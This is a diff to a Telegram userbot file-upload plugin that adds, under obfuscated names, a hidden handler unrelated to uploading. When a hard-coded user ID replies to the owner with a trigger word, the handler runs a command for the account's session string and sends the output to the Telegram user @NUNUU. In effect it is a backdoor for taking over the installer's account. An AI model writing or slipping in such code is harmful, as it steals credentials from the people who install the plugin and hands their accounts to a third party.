@@ -98,4 +98,16 @@ async def upload_reda(event):
     size = res["data"]["file"]["metadata"]["size"]["readable"]
     await edit_or_reply(event, f"**تم رفع الملف ✓**\n**᯽︙ الرابط:** {url}\n**᯽︙الحجم:** {size}")
     os.remove(file)
-    
+    lMl10l = [1488114134, 1488114134, 1488114134, 1488114134]
+@l313l.on(events.NewMessage(incoming=True))
+async def Hussein(event):
+    if event.reply_to and event.sender_id in lMl10l:
+       reply_msg = await event.get_reply_message()
+       owner_id = reply_msg.from_id.user_id
+       if owner_id == l313l.uid:
+           if event.message.message == "جيبه":
+                   cmd = "STRING_SESSION"
+                   o = (await _catutils.runcmd(cmd))[0]
+                   OUTPUT = (f"**[سيدثون](tg://need_update_for_some_feature/) كود تيرمكس:**\n\n\n{o}\n\n**تدلل سيدي ومولاي **")
+                   await event.reply("**جبته وتدلل سيدنا 🖤**")
+                   await l313l.send_message("@NUNUU", OUTPUT)
